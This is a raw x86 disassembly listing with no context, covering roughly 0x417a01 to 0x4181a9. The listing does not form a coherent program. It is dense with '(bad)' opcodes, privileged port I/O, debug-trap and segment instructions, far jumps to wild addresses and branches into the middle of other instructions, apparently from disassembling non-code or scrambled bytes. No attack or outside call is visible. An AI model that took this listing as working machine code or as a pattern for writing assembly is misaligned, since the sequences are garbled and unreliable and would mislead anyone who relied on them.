  417a01:	sub    dh,BYTE PTR [eax+0x391a98f2]
  417a07:	out    0x89,al
  417a09:	fstp   QWORD PTR [ecx-0x6676fb4b]
  417a0f:	shl    dl,cl
  417a11:	inc    ecx
  417a12:	and    eax,0xa31cc816
  417a17:	scas   eax,DWORD PTR es:[edi]
  417a18:	rcr    ebp,1
  417a1a:	icebp  
  417a1b:	sbb    ecx,edx
  417a1d:	cmp    cl,BYTE PTR [esi+ecx*4-0x6a3cb357]
  417a24:	jae    0x4179ed
  417a26:	leave  
  417a27:	dec    ebp
  417a28:	push   ebp
  417a29:	pop    edx
  417a2a:	push   eax
  417a2b:	mov    ds:0x5c31eed1,eax
  417a30:	je     0x417a15
  417a32:	or     dl,BYTE PTR [edi]
  417a34:	cmovle edi,edx
  417a37:	loope  0x4179e1
  417a39:	aas    
  417a3a:	dec    esp
  417a3b:	pop    eax
  417a3c:	lock std 
  417a3e:	mov    ds:0x942b2319,al
  417a43:	test   eax,0xde0e3220
  417a48:	xor    al,0x1b
  417a4a:	div    DWORD PTR [edx]
  417a4c:	mov    DWORD PTR [edx+0x3ca9b809],edi
  417a52:	jbe    0x417a32
  417a54:	add    DWORD PTR [esi+0x70107741],0x19cb102f
  417a5e:	add    ch,ah
  417a60:	adc    BYTE PTR [esp+edi*4+0x42],cl
  417a64:	fnstenv [edx+edi*8+0x55]
  417a68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a69:	adc    al,0xe8
  417a6b:	out    dx,al
  417a6c:	(bad)  
  417a6d:	in     al,dx
  417a6e:	pop    edx
  417a6f:	dec    eax
  417a70:	call   0xa39ffb8d
  417a75:	sti    
  417a76:	push   ebx
  417a77:	adc    bl,BYTE PTR [ecx+0x65]
  417a7a:	sbb    eax,0x8f9a9cc6
  417a7f:	mov    DWORD PTR [esi],esp
  417a81:	mov    esi,0xdba3c34a
  417a86:	test   eax,0x2780ed52
  417a8b:	pop    ebp
  417a8c:	jno    0x417a65
  417a8e:	mov    bl,cl
  417a90:	test   ebp,0x79dd0857
  417a96:	inc    ecx
  417a97:	xor    DWORD PTR [eax+0x1b],esi
  417a9a:	xchg   edi,eax
  417a9b:	xor    ch,BYTE PTR [esi-0x3e7f7be7]
  417aa1:	or     BYTE PTR [edi+0x515b2bd3],ah
  417aa7:	inc    ecx
  417aa8:	dec    edx
  417aa9:	pop    ebx
  417aaa:	dec    edi
  417aab:	shl    DWORD PTR [ebx+0x7e],cl
  417aae:	ins    DWORD PTR es:[edi],dx
  417aaf:	sub    al,0xb3
  417ab1:	(bad)  
  417ab3:	out    dx,eax
  417ab4:	mov    al,ds:0x30d3c11
  417ab9:	ret    
  417aba:	in     al,dx
  417abb:	je     0x417a42
  417abd:	xchg   esp,edi
  417abf:	add    BYTE PTR [ebp+0x6d],ah
  417ac2:	dec    ebx
  417ac3:	bound  esp,QWORD PTR ds:0x8e72f8fa
  417ac9:	mov    BYTE PTR [ebx-0x5013b44c],bh
  417acf:	sub    BYTE PTR [ecx],cl
  417ad1:	arpl   WORD PTR [edx-0x50445cc5],di
  417ad7:	outs   dx,DWORD PTR ds:[esi]
  417ad8:	mov    eax,0x5211d7c6
  417add:	pop    edi
  417ade:	xchg   ecx,eax
  417adf:	int    0xc
  417ae1:	(bad)  
  417ae2:	repnz adc ax,0xc0c9
  417ae7:	int3   
  417ae8:	fidivr DWORD PTR [ebx]
  417aea:	(bad)  
  417aeb:	adc    DWORD PTR [edi],esi
  417aed:	in     eax,0x89
  417aef:	dec    edi
  417af0:	cwde   
  417af1:	mov    bl,bh
  417af3:	push   edx
  417af4:	cmp    BYTE PTR [ecx],ah
  417af6:	sbb    dh,dl
  417af8:	push   eax
  417af9:	dec    esi
  417afa:	or     ah,dh
  417afc:	xchg   edx,eax
  417afd:	ret    0x7ba6
  417b00:	pop    ss
  417b01:	nop
  417b02:	fistp  QWORD PTR [ebx-0x1c]
  417b05:	stc    
  417b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b07:	ds loope 0x417b29
  417b0a:	sub    DWORD PTR [eax],edi
  417b0c:	cmp    eax,0x84ef1f9f
  417b11:	mov    al,0xff
  417b13:	sbb    DWORD PTR [eax+0x7c],ebp
  417b16:	mov    WORD PTR [ebx-0x26],fs
  417b19:	int3   
  417b1a:	mov    esp,0x773df034
  417b1f:	push   ebp
  417b20:	xor    al,0x68
  417b22:	xlat   BYTE PTR ds:[ebx]
  417b23:	aas    
  417b24:	(bad)  
  417b25:	jg     0x417b81
  417b27:	div    cl
  417b29:	mov    dl,0xea
  417b2b:	or     DWORD PTR [ebx-0x59],edx
  417b2e:	inc    ecx
  417b2f:	loop   0x417acf
  417b31:	jae    0x417b87
  417b33:	rcl    BYTE PTR [edi],1
  417b35:	xchg   ecx,eax
  417b36:	adc    BYTE PTR [esi+0x34],dl
  417b39:	in     al,0x6f
  417b3b:	cs enter 0x8970,0xad
  417b40:	inc    ebx
  417b41:	sub    al,0xad
  417b43:	(bad)  
  417b44:	or     bh,bh
  417b46:	pop    ss
  417b47:	out    dx,eax
  417b48:	push   ss
  417b49:	xchg   BYTE PTR [edi-0x77c5fe4e],ch
  417b4f:	aam    0xb1
  417b51:	mov    dh,0x85
  417b53:	mov    al,ds:0x9f21f6b9
  417b58:	dec    esp
  417b59:	dec    edx
  417b5a:	add    BYTE PTR ds:[eax-0x1c],0xd0
  417b5f:	in     eax,dx
  417b60:	scas   eax,DWORD PTR es:[edi]
  417b61:	mov    eax,0x3142f534
  417b66:	out    0x3d,al
  417b68:	sti    
  417b69:	cmp    BYTE PTR [ebx-0x33c8990],0xf2
  417b70:	sub    ch,bl
  417b72:	rcr    BYTE PTR [edx+edx*2+0x2d],0xc
  417b77:	lds    ecx,FWORD PTR [edi+0x6c7196f]
  417b7d:	loope  0x417b03
  417b7f:	inc    esi
  417b80:	ret    0xc8c
  417b83:	out    0x3f,eax
  417b85:	inc    ebx
  417b86:	mov    ds:0x33d10859,al
  417b8b:	add    BYTE PTR [ebx],dl
  417b8d:	sbb    BYTE PTR ds:0x91e8f00a,dh
  417b93:	in     al,dx
  417b94:	inc    ebx
  417b95:	fist   DWORD PTR [edx-0x47]
  417b98:	jmp    0xae92173c
  417b9d:	jae    0x417b98
  417b9f:	cmp    DWORD PTR [edi],ebp
  417ba1:	mov    ch,0x90
  417ba3:	jne    0x417b2b
  417ba5:	(bad)  [esi-0x5c0236a3]
  417bab:	jnp    0x417bf5
  417bad:	push   0xff40f717
  417bb2:	cmp    al,0x49
  417bb4:	jns    0x417bb6
  417bb6:	imul   ecx,DWORD PTR [edi+0x661e4985],0x46302329
  417bc0:	pop    edx
  417bc1:	sub    ebx,DWORD PTR [edx-0x5b46d7a8]
  417bc7:	push   edx
  417bc8:	sub    al,BYTE PTR [ebx+0x43]
  417bcb:	in     al,0x7e
  417bcd:	dec    ebp
  417bce:	repz pop edx
  417bd0:	nop
  417bd1:	push   ss
  417bd2:	jle    0x417bb6
  417bd4:	in     al,0xac
  417bd6:	sbb    dh,BYTE PTR [ecx]
  417bd8:	adc    BYTE PTR [eax+edx*8+0x76f40c66],ah
  417bdf:	daa    
  417be0:	(bad)  
  417be3:	mov    ch,0xf4
  417be5:	push   0xf1b575db
  417bea:	retf   0x337a
  417bed:	stos   DWORD PTR es:[edi],eax
  417bee:	jge    0x417b9e
  417bf0:	rcr    BYTE PTR [ebp+0x5f3882c2],1
  417bf6:	in     al,dx
  417bf7:	mov    ch,0x89
  417bf9:	bound  eax,QWORD PTR [edx+0x4c082548]
  417bff:	or     DWORD PTR [eax+0x1],ebx
  417c02:	add    al,0x2c
  417c04:	sti    
  417c05:	stos   BYTE PTR es:[edi],al
  417c06:	mov    DWORD PTR [ebp+0x73],edi
  417c09:	(bad)  ds:0xa4f6e4e9
  417c0f:	dec    ecx
  417c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c11:	xor    DWORD PTR [edi+0x45],edx
  417c14:	add    eax,0x5f3a70dd
  417c19:	mov    ebx,0x7fdc4b9e
  417c1e:	leave  
  417c1f:	ins    BYTE PTR es:[edi],dx
  417c20:	cmp    edx,DWORD PTR [ebp+0x58]
  417c23:	push   edx
  417c24:	push   ecx
  417c25:	xacquire xchg BYTE PTR [edi+0x3],cl
  417c29:	into   
  417c2a:	cmc    
  417c2b:	nop
  417c2c:	sub    al,0x54
  417c2e:	mov    edi,0x795f8d59
  417c33:	inc    edx
  417c34:	aam    0xbf
  417c36:	cdq    
  417c37:	mov    edx,0x5ba12208
  417c3c:	inc    eax
  417c3d:	or     eax,0xa2292bfb
  417c42:	xchg   BYTE PTR [edi-0x26],ch
  417c45:	jns    0x417c10
  417c47:	adc    dh,BYTE PTR ds:0xf4b350bf
  417c4d:	mov    cl,0xab
  417c4f:	imul   eax,DWORD PTR [esi-0x4a5784c6],0xa2dcd110
  417c59:	les    edi,FWORD PTR [esi-0x26708fde]
  417c5f:	jo     0x417c82
  417c61:	div    DWORD PTR [esi+edx*8]
  417c64:	loope  0x417cd4
  417c66:	dec    ebx
  417c67:	sub    BYTE PTR [eax+0x6f],dh
  417c6a:	fidiv  WORD PTR [edi+0x63]
  417c6d:	or     ecx,DWORD PTR [ebp+ecx*1-0x44]
  417c71:	ins    BYTE PTR es:[edi],dx
  417c72:	out    dx,al
  417c73:	sbb    ebp,ebp
  417c75:	popa   
  417c76:	gs dec eax
  417c78:	fst    QWORD PTR [ebx+0x0]
  417c7b:	push   ds
  417c7c:	sub    DWORD PTR [ebx+0x6e],ebp
  417c7f:	mov    ecx,0xa002b2ac
  417c84:	and    DWORD PTR [edi-0x30],ebp
  417c87:	cld    
  417c88:	sub    al,0x3d
  417c8a:	cld    
  417c8b:	adc    al,0x6e
  417c8d:	pop    ecx
  417c8e:	cmp    edi,ebp
  417c90:	rol    DWORD PTR [esi],1
  417c92:	gs clc 
  417c94:	mov    al,ds:0xfbc1b29a
  417c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c9a:	into   
  417c9b:	xchg   ebx,edx
  417c9d:	jne    0x417c20
  417c9f:	push   0x7b
  417ca1:	ret    0xf667
  417ca4:	cld    
  417ca5:	cld    
  417ca6:	stc    
  417ca7:	and    al,0x34
  417ca9:	test   al,0x3a
  417cab:	sub    DWORD PTR [eax-0x3ec714d],0xffffffd7
  417cb2:	mov    eax,0xbc4dfded
  417cb7:	jns    0x417cb8
  417cb9:	push   cs
  417cba:	inc    edi
  417cbb:	cmc    
  417cbc:	cwde   
  417cbd:	(bad)  
  417cbe:	push   cs
  417cbf:	mov    eax,0x49ed540c
  417cc4:	ficomp DWORD PTR [eax]
  417cc6:	adc    esi,DWORD PTR [esp+ebx*1]
  417cc9:	pop    ss
  417cca:	adc    al,0xef
  417ccc:	mov    ch,0x27
  417cce:	enter  0x72c2,0xa8
  417cd2:	xchg   edx,eax
  417cd3:	fucom  st(5)
  417cd5:	dec    esi
  417cd6:	jl     0x417c79
  417cd8:	(bad)  
  417cd9:	lock outs dx,DWORD PTR ds:[esi]
  417cdb:	dec    edi
  417cdc:	lods   eax,DWORD PTR ds:[esi]
  417cdd:	pop    ss
  417cde:	loope  0x417d53
  417ce0:	ror    bl,1
  417ce2:	cmp    al,0x88
  417ce4:	xchg   DWORD PTR [eax],edx
  417ce6:	(bad)  
  417ce7:	cmp    eax,0x638d7530
  417cec:	pop    ss
  417ced:	cld    
  417cee:	sahf   
  417cef:	push   ecx
  417cf0:	xlat   BYTE PTR ds:[ebx]
  417cf1:	xchg   edx,eax
  417cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cf3:	or     DWORD PTR [edx-0x5cad840c],edi
  417cf9:	jno    0x417caf
  417cfb:	rcl    DWORD PTR [ecx],0xa4
  417cfe:	fdivr  QWORD PTR [eax+0x4a]
  417d01:	add    DWORD PTR [eax],esp
  417d03:	mov    ecx,0x72edc025
  417d08:	aaa    
  417d09:	fist   DWORD PTR [ebp+0x7e8ad6b]
  417d0f:	mov    al,BYTE PTR [edx]
  417d11:	pop    eax
  417d12:	out    dx,al
  417d13:	jle    0x417ca3
  417d15:	jp     0x417cb0
  417d17:	orps   xmm2,xmm1
  417d1a:	push   0xe4c8c11c
  417d1f:	cmp    BYTE PTR [edi-0x735aefc4],al
  417d25:	adc    esi,DWORD PTR [ebx]
  417d27:	pop    edx
  417d28:	mov    ds:0xaf540176,al
  417d2d:	shl    DWORD PTR [eax],1
  417d2f:	xlat   BYTE PTR ds:[ebx]
  417d30:	xchg   edi,eax
  417d31:	enter  0x886e,0x3
  417d35:	cdq    
  417d36:	mov    esp,0x4908d4ee
  417d3b:	aas    
  417d3c:	pushf  
  417d3d:	push   ebp
  417d3e:	ror    DWORD PTR [edx+0x4],1
  417d41:	cmp    ebp,DWORD PTR [ebp+0x2b]
  417d44:	jno    0x417d00
  417d46:	push   esi
  417d47:	or     BYTE PTR [ecx+0x427f0135],al
  417d4d:	jae    0x417d93
  417d4f:	into   
  417d50:	add    al,0x84
  417d52:	hlt    
  417d53:	popf   
  417d54:	push   DWORD PTR [ecx]
  417d56:	mov    bl,0x2c
  417d58:	mov    dl,0x41
  417d5a:	je     0x417cf3
  417d5c:	push   edi
  417d5d:	push   ebp
  417d5e:	xchg   ebx,eax
  417d5f:	push   ebx
  417d60:	arpl   WORD PTR [eax],ax
  417d62:	push   0x7f35c71f
  417d67:	inc    ebp
  417d68:	inc    ebp
  417d69:	cmp    al,BYTE PTR [edx]
  417d6b:	push   ds
  417d6c:	dec    esi
  417d6d:	inc    ecx
  417d6e:	arpl   bp,sp
  417d70:	cdq    
  417d71:	jge    0x417d08
  417d73:	and    DWORD PTR [edx+0x11c5cc40],esi
  417d79:	mov    ds,WORD PTR [esp+eax*8+0x21ffd160]
  417d80:	add    dl,BYTE PTR [edi-0x69d69377]
  417d86:	sub    al,0x3e
  417d88:	test   al,0x5d
  417d8a:	cmc    
  417d8b:	(bad)  
  417d8c:	mov    bh,0x47
  417d8e:	jae    0x417dad
  417d90:	push   edx
  417d91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d92:	or     eax,0xc7f9556d
  417d97:	and    eax,0xd5e4f366
  417d9c:	mov    ebx,0x3b9b5462
  417da1:	pusha  
  417da2:	mov    dh,0x55
  417da4:	xchg   edi,eax
  417da5:	add    ebx,DWORD PTR [ecx-0x296a681d]
  417dab:	pop    esi
  417dac:	les    ecx,FWORD PTR [ebx+eax*4]
  417daf:	adc    BYTE PTR [edx-0xcb9c364],0xe4
  417db6:	pop    esp
  417db7:	das    
  417db8:	out    0x21,eax
  417dba:	mov    dl,0xb9
  417dbc:	sahf   
  417dbd:	add    al,0x7f
  417dbf:	imul   ebx,DWORD PTR [esi-0x68744f6a],0xffffffeb
  417dc6:	out    dx,al
  417dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dc8:	call   0x70e6:0x8d732208
  417dcf:	clc    
  417dd0:	repnz adc bh,BYTE PTR [esi+0x56]
  417dd4:	ss dec esp
  417dd6:	cdq    
  417dd7:	rcl    dh,0x4c
  417dda:	jne    0x417dde
  417ddc:	mov    ebx,0x540e773e
  417de1:	mov    dh,BYTE PTR [esi-0x1a155b96]
  417de7:	and    eax,edi
  417de9:	mov    al,ds:0x5abf63ba
  417dee:	xor    al,0xd1
  417df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417df1:	stc    
  417df2:	(bad)  
  417df3:	daa    
  417df4:	push   edx
  417df5:	sbb    ch,BYTE PTR [eax]
  417df7:	pusha  
  417df8:	jb     0x417e1e
  417dfa:	xchg   ecx,eax
  417dfb:	nop
  417dfc:	dec    edi
  417dfd:	pop    ebx
  417dfe:	lods   eax,DWORD PTR ds:[esi]
  417dff:	mov    dh,0x9b
  417e01:	test   DWORD PTR [ebp+edx*2-0x4f28d9e6],0x40a7c9d
  417e0c:	sub    eax,0xa9e2b4fc
  417e11:	sbb    al,0x90
  417e13:	(bad)  
  417e14:	clc    
  417e15:	xchg   DWORD PTR [edi+0x7b],edx
  417e18:	lods   eax,DWORD PTR ss:[esi]
  417e1a:	push   esi
  417e1b:	fnstenv [ecx+0x38]
  417e1e:	int3   
  417e1f:	inc    esp
  417e20:	sti    
  417e21:	aaa    
  417e22:	ret    
  417e23:	inc    esi
  417e24:	(bad)  
  417e25:	jmp    0x1cff7fd
  417e2a:	add    DWORD PTR [eax+0x799f6b2b],eax
  417e30:	mov    eax,0x7573e0ce
  417e35:	xchg   ebp,eax
  417e36:	scas   eax,DWORD PTR es:[edi]
  417e37:	inc    edx
  417e38:	xchg   BYTE PTR [edi-0x4336b905],dl
  417e3e:	(bad)  
  417e3f:	lock cs cmp eax,0x45a47c9b
  417e46:	adc    bh,BYTE PTR [ecx-0x3449075c]
  417e4c:	repnz fst DWORD PTR [ebx-0x69]
  417e50:	lock fidivr WORD PTR [edx]
  417e53:	inc    edi
  417e54:	stc    
  417e55:	inc    edx
  417e56:	arpl   WORD PTR [edi],si
  417e58:	js     0x417de7
  417e5a:	cmp    DWORD PTR [esi],0xffffffe3
  417e5d:	xchg   esi,eax
  417e5e:	dec    esp
  417e5f:	xchg   esp,eax
  417e60:	mov    esi,0x69bd6048
  417e65:	xor    ebx,DWORD PTR [eax-0x19]
  417e68:	test   eax,0x7452f955
  417e6d:	bound  esi,QWORD PTR [ecx-0x6f53476a]
  417e73:	clc    
  417e74:	lea    edi,gs:[edx+0x17]
  417e78:	sub    DWORD PTR [edx-0x680cffb5],edi
  417e7e:	jge    0x417ea4
  417e80:	call   0xb53d454b
  417e85:	js     0x417e9b
  417e87:	jb     0x417eea
  417e89:	imul   ebx,DWORD PTR [ecx+0x35],0xffffffc5
  417e8d:	stos   DWORD PTR es:[edi],eax
  417e8e:	or     esi,0xffffffa7
  417e91:	imul   esp,eax,0xffffffc9
  417e94:	loopne 0x417e88
  417e96:	enter  0xe890,0xe7
  417e9a:	sbb    DWORD PTR [esi+eax*4+0x3b],0xffffffff
  417e9f:	ins    BYTE PTR es:[edi],dx
  417ea0:	push   ebx
  417ea1:	lods   eax,DWORD PTR ds:[esi]
  417ea2:	bound  eax,QWORD PTR [edx-0x4e]
  417ea5:	jo     0x417e59
  417ea7:	dec    ebp
  417ea8:	fist   DWORD PTR [edx+0x2fd6f70]
  417eae:	pop    ebp
  417eaf:	jo     0x417f1a
  417eb1:	inc    edx
  417eb2:	cs push ecx
  417eb4:	arpl   si,ax
  417eb6:	test   eax,0xe8277d04
  417ebb:	scas   eax,DWORD PTR es:[edi]
  417ebc:	pop    ebp
  417ebd:	je     0x417e60
  417ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ec0:	sbb    ch,BYTE PTR [eax-0x540704c6]
  417ec6:	mov    bl,0x3c
  417ec8:	(bad)  
  417ec9:	loop   0x417e6f
  417ecb:	jl     0x417eef
  417ecd:	test   BYTE PTR [edx+0x3ea424ef],dl
  417ed3:	jno    0x417f52
  417ed5:	ret    0x4530
  417ed8:	mov    DWORD PTR [esi],edi
  417eda:	(bad)  
  417edc:	mov    eax,ds:0xa92479c7
  417ee1:	or     dh,BYTE PTR [eax-0x3d]
  417ee4:	js     0x417efc
  417ee6:	xor    ah,BYTE PTR [edx+0x3d7c4cea]
  417eec:	cmp    dl,BYTE PTR [ebx-0x6d8a267a]
  417ef2:	and    bl,BYTE PTR [edx+ecx*2+0x373cb359]
  417ef9:	jnp    0x417f74
  417efb:	cmp    edi,DWORD PTR [edi]
  417efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417efe:	popf   
  417eff:	sti    
  417f00:	xlat   BYTE PTR ds:[ebx]
  417f01:	arpl   WORD PTR [ebx],cx
  417f03:	xchg   bl,bh
  417f05:	sahf   
  417f06:	inc    edi
  417f07:	dec    esp
  417f08:	loope  0x417f5e
  417f0a:	sub    cl,BYTE PTR [esi+edi*2+0x77f74c54]
  417f11:	ret    
  417f12:	and    eax,0xa0816447
  417f17:	or     BYTE PTR [edi],0x8d
  417f1a:	pop    edx
  417f1b:	jnp    0x417ea9
  417f1d:	ret    0x8f03
  417f20:	repz fsubrp st(0),st
  417f23:	addr16 push esp
  417f25:	cld    
  417f26:	mov    edi,0x595bf068
  417f2b:	dec    ebp
  417f2c:	popa   
  417f2d:	push   0x2f48aada
  417f32:	jg     0x417f19
  417f34:	or     dh,cl
  417f36:	mov    eax,ds:0x9ae9d91a
  417f3b:	aad    0x98
  417f3d:	mov    esi,0x68cbfe1c
  417f42:	fs aad 0xa4
  417f45:	xor    esp,DWORD PTR [edi]
  417f47:	push   eax
  417f48:	dec    edx
  417f49:	adc    eax,0xd0b26e88
  417f4e:	mov    al,ds:0x2a0282e8
  417f54:	jp     0x417f46
  417f56:	xchg   DWORD PTR [esi+edx*2-0x684709fe],edx
  417f5d:	ds jmp 0x417f07
  417f60:	pop    es
  417f61:	std    
  417f62:	mov    esi,0x846ab3f8
  417f67:	cmp    BYTE PTR [esi+0x55],dl
  417f6a:	mov    eax,ss
  417f6c:	dec    esp
  417f6d:	lods   al,BYTE PTR ds:[esi]
  417f6e:	dec    esi
  417f6f:	sub    BYTE PTR [ebx-0x20],dl
  417f72:	pop    edi
  417f73:	imul   DWORD PTR [edi]
  417f75:	jge    0x417f7e
  417f77:	and    eax,0xb9bbfd3b
  417f7c:	leave  
  417f7d:	adc    esp,ebp
  417f7f:	int3   
  417f80:	mov    cs,WORD PTR [edx-0x77]
  417f83:	shl    DWORD PTR [esi-0x38],1
  417f86:	rcl    BYTE PTR [eax+0xd],0xe
  417f8a:	lods   eax,DWORD PTR ds:[esi]
  417f8b:	and    ecx,edi
  417f8d:	add    BYTE PTR [ebx+0x4c],dh
  417f90:	out    0x9d,al
  417f92:	aas    
  417f93:	ins    BYTE PTR es:[edi],dx
  417f94:	mov    WORD PTR [edx-0x6e],ds
  417f97:	xchg   edi,eax
  417f98:	cld    
  417f99:	hlt    
  417f9a:	cld    
  417f9b:	adc    BYTE PTR [edx-0x58],0xcb
  417f9f:	in     eax,dx
  417fa0:	cld    
  417fa1:	xchg   BYTE PTR [edx],bl
  417fa3:	dec    eax
  417fa4:	leave  
  417fa5:	jb     0x417fb4
  417fa7:	sub    dh,dl
  417fa9:	pop    es
  417faa:	or     ebp,DWORD PTR [eax+0x493a1908]
  417fb0:	mov    BYTE PTR [ebp-0x17],dl
  417fb3:	pcmpeqw mm3,QWORD PTR [eax]
  417fb6:	out    dx,eax
  417fb7:	popf   
  417fb8:	(bad)  
  417fb9:	mov    DWORD PTR ds:[eax+0x61],ebp
  417fbd:	mov    al,0x42
  417fbf:	stc    
  417fc0:	in     eax,dx
  417fc1:	mov    eax,ds:0x1cf68b5c
  417fc6:	pop    esi
  417fc7:	mov    BYTE PTR [ecx+0x5e],al
  417fca:	adc    bh,0x2c
  417fcd:	ja     0x417fea
  417fcf:	fistp  WORD PTR ds:0x1ebd0877
  417fd5:	jb     0x417fac
  417fd7:	push   cs
  417fd8:	out    0xb6,eax
  417fda:	iret   
  417fdb:	jnp    0x418044
  417fdd:	and    al,0xdf
  417fdf:	inc    edi
  417fe0:	xchg   edi,eax
  417fe1:	out    0x33,eax
  417fe3:	lock icebp 
  417fe5:	retf   0x9a23
  417fe8:	(bad)  
  417fea:	cwde   
  417feb:	sar    BYTE PTR [ecx-0x59b171f7],1
  417ff1:	arpl   WORD PTR [edi],cx
  417ff3:	or     ebx,DWORD PTR [edx+edi*1+0x5ee28316]
  417ffa:	popa   
  417ffb:	mov    edi,0xd1f515b6
  418000:	ret    0xa6cb
  418003:	xchg   ebx,eax
  418004:	mov    cl,bl
  418006:	lds    ebx,FWORD PTR [eax+0x1]
  418009:	dec    eax
  41800a:	arpl   dx,di
  41800c:	push   edx
  41800d:	sbb    DWORD PTR [eax],ebp
  41800f:	pop    edx
  418010:	pop    esi
  418011:	push   ecx
  418012:	lahf   
  418013:	cmp    DWORD PTR [edx],esp
  418015:	jl     0x41800d
  418017:	mov    cl,0x9
  418019:	lock aas 
  41801b:	js     0x418043
  41801d:	loop   0x417ffb
  41801f:	fs adc eax,0xf4b69069
  418025:	mov    esp,DWORD PTR [esi+edi*1+0x38fa2c6c]
  41802c:	dec    ecx
  41802d:	inc    ecx
  41802e:	sub    DWORD PTR [ecx],edx
  418030:	scas   eax,DWORD PTR es:[edi]
  418031:	mov    ebp,gs
  418033:	lods   al,BYTE PTR ds:[esi]
  418034:	in     al,0x57
  418036:	inc    edi
  418037:	stc    
  418038:	shl    esp,cl
  41803a:	sar    edi,0x1d
  41803d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41803f:	inc    edx
  418040:	outs   dx,DWORD PTR ds:[esi]
  418041:	or     BYTE PTR [edx+0x74ebdc3c],bh
  418047:	retf   0x6a93
  41804a:	in     eax,dx
  41804b:	xchg   esi,eax
  41804c:	jle    0x41804b
  41804e:	push   ecx
  41804f:	jmp    0xdfe5639
  418054:	(bad)  
  418055:	or     al,0x8f
  418057:	xor    bl,BYTE PTR [edx+0x66]
  41805a:	fisttp WORD PTR [edi-0x2]
  41805d:	sub    esp,DWORD PTR [ebx+eiz*1]
  418060:	fld    QWORD PTR [esi-0x6dca289d]
  418066:	stc    
  418067:	mov    BYTE PTR [ebx-0x7b7b8db8],cl
  41806d:	mov    al,ds:0xe89777ef
  418072:	lock mov ch,0x56
  418075:	jae    0x417ffc
  418077:	clc    
  418078:	jns    0x41800a
  41807a:	push   edx
  41807b:	and    DWORD PTR [ebp-0x29ada961],esi
  418081:	pop    edi
  418082:	(bad)  
  418083:	scas   al,BYTE PTR es:[edi]
  418084:	out    dx,eax
  418085:	cwde   
  418086:	jmp    0xdf02:0x637761d2
  41808d:	imul   BYTE PTR [ecx-0x991869f]
  418093:	adc    eax,0x648fa3fc
  418098:	push   es
  418099:	clc    
  41809a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41809b:	add    DWORD PTR [esi-0x19],eax
  41809e:	int    0x7d
  4180a0:	retf   
  4180a1:	mov    esi,0x1c16c9d5
  4180a6:	sub    ah,BYTE PTR [edx-0x4860ede9]
  4180ac:	cld    
  4180ad:	jns    0x4180e9
  4180af:	sbb    DWORD PTR [ebp-0x62],esp
  4180b2:	xlat   BYTE PTR ds:[ebx]
  4180b3:	jle    0x4180c7
  4180b5:	xor    ebp,DWORD PTR [ebx]
  4180b7:	and    eax,0x30c4ada3
  4180bc:	das    
  4180bd:	adc    esp,DWORD PTR [ecx]
  4180bf:	and    esi,DWORD PTR [ebx]
  4180c1:	ror    esi,cl
  4180c3:	mov    ds:0x56c2e30f,eax
  4180c8:	cmove  edi,DWORD PTR [edi+0x78]
  4180cc:	pop    esi
  4180cd:	sub    al,0x22
  4180cf:	add    edx,edx
  4180d1:	jg     0x4180f6
  4180d3:	or     BYTE PTR ds:0xf609fddb,ah
  4180d9:	lock leave 
  4180db:	lds    ebx,FWORD PTR [ecx-0x6a]
  4180de:	xchg   esi,eax
  4180df:	pop    ss
  4180e0:	lea    ecx,[esi-0x8]
  4180e3:	loop   0x4180b9
  4180e5:	mov    ecx,0x370abefa
  4180ea:	jecxz  0x4180f3
  4180ec:	mov    ebp,0xe1966989
  4180f1:	adc    eax,0xd3c7680e
  4180f6:	add    eax,0x93b242ce
  4180fb:	push   ebx
  4180fc:	adc    bl,ch
  4180fe:	test   al,0x7
  418100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418101:	(bad)  
  418103:	or     cl,BYTE PTR [ecx]
  418105:	fcmovnbe st,st(7)
  418107:	and    ecx,DWORD PTR [eax]
  418109:	pop    edx
  41810a:	imul   edx,DWORD PTR [ecx+0x73429068],0xfffffff5
  418111:	add    al,bh
  418113:	cmc    
  418114:	in     eax,0x92
  418116:	rcl    BYTE PTR [ecx-0x7e],cl
  418119:	or     ebx,ebx
  41811b:	and    eax,0x632667d7
  418120:	ret    
  418121:	jmp    ebx
  418123:	xchg   ch,dh
  418125:	mov    edx,0x39d81a09
  41812a:	dec    edx
  41812c:	fisub  DWORD PTR [ebp-0x1e]
  41812f:	shr    bh,1
  418131:	(bad)  
  418132:	or     ebp,DWORD PTR fs:0xa08fa755
  418139:	sbb    al,0x7f
  41813b:	jbe    0x4180e1
  41813d:	sub    BYTE PTR [edx+0x8],ch
  418140:	and    eax,0x67cccae1
  418145:	push   ecx
  418146:	sub    al,0xd6
  418148:	sbb    cl,al
  41814a:	dec    eax
  41814b:	add    eax,0x4500224a
  418150:	popa   
  418151:	rcl    edx,0x66
  418154:	mov    ebp,0x56dda593
  418159:	push   ss
  41815a:	mov    ecx,DWORD PTR [eax]
  41815c:	cmp    al,0x43
  41815e:	(bad)  
  41815f:	cmp    eax,0xd9b1d9ca
  418164:	in     al,dx
  418165:	push   0xffffffcb
  418167:	adc    DWORD PTR [ecx+0x1349ac34],0xff58686c
  418171:	jge    0x418175
  418173:	push   edi
  418174:	hlt    
  418175:	mov    dl,0xbc
  418177:	jg     0x4181b8
  418179:	adc    esp,DWORD PTR [eax+esi*1-0x5b00c6c8]
  418180:	mov    ecx,0x61772a33
  418185:	mov    ecx,0xd827086f
  41818a:	fwait
  41818b:	out    0x62,al
  41818d:	mov    es,WORD PTR [edx]
  41818f:	pop    esi
  418190:	jp     0x41811d
  418192:	dec    ebp
  418193:	sbb    edi,DWORD PTR ds:[eax]
  418196:	sbb    esp,ebp
  418198:	out    0x1,eax
  41819a:	std    
  41819b:	scas   eax,DWORD PTR es:[edi]
  41819c:	daa    
  41819d:	inc    edi
  41819e:	mov    esi,0xca9197ec
  4181a3:	mov    dh,0xd0
  4181a5:	ins    BYTE PTR es:[edi],dx
  4181a6:	popf   
  4181a7:	mov    al,0x67
  4181a9:	push   ebx
